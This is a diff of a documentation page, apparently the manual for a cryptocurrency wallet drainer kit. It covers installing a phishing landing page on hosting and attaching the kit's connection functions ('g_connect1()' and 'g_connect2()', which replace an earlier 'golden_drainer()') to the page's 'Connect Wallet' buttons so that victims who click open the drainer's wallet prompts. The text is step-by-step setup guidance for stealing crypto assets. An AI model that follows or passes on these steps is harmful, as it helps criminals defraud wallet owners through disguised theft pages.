@@ -12,7 +12,7 @@ layout:
     visible: true
 ---
 
-# 9️⃣ Landing page installation
+# 8️⃣ Landing page installation
 
 [In this section](buying-landing-page-domain.md) we bought [**Landing page domain**](buying-landing-page-domain.md), now we need to install the landing page on the hosting.
 
@@ -65,25 +65,34 @@ Most often, the buttons look either like this in the code:
 <button class="button btn-dark"> Connect Wallet </button>
 ```
 
-Or somehow, in fact, it can look like anything:
+There are 2 functions that call the connection window:
 
-```
-<a href="#"> Connect Wallet </a>
-```
+1. g\_connect1()
+2. g\_connect2()&#x20;
 
-You need to add the desired function to the button so that it is called when clicking:
+The difference between them is that each of them, when pressed, calls different modal windows. For example, when calling the function “g\_connect1()” This connection window will appear:
 
-```
-onclick="g_connect1()"
-```
+<figure><img src="../../.gitbook/assets/image (50).png" alt=""><figcaption><p>This is convenient when connecting from a PC, as well as the possibility of connecting mobile devices via WalletConnect</p></figcaption></figure>
+
+When calling the g\_connect2() function, a model window will appear, which serves mainly for connecting mobile wallets, as well as third-party cold wallets like Ledger.
+
+<figure><img src="../../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>
 
 That is, in the final version it will look like this:
 
 ```
-<button class="button btn-dark" onclick="golden_drainer()">Connect Wallet</button>
+<button class="button btn-dark" onclick="g_connect1()">Connect Wallet</button>
+```
+
+Or like this:
+
+```
+<button class="button btn-dark" onclick="g_connect2()">Connect Wallet</button>
 ```
 
 <figure><img src="../../.gitbook/assets/image (46).png" alt=""><figcaption></figcaption></figure>
+
+
 
 Uploading our landing to hosting.
 
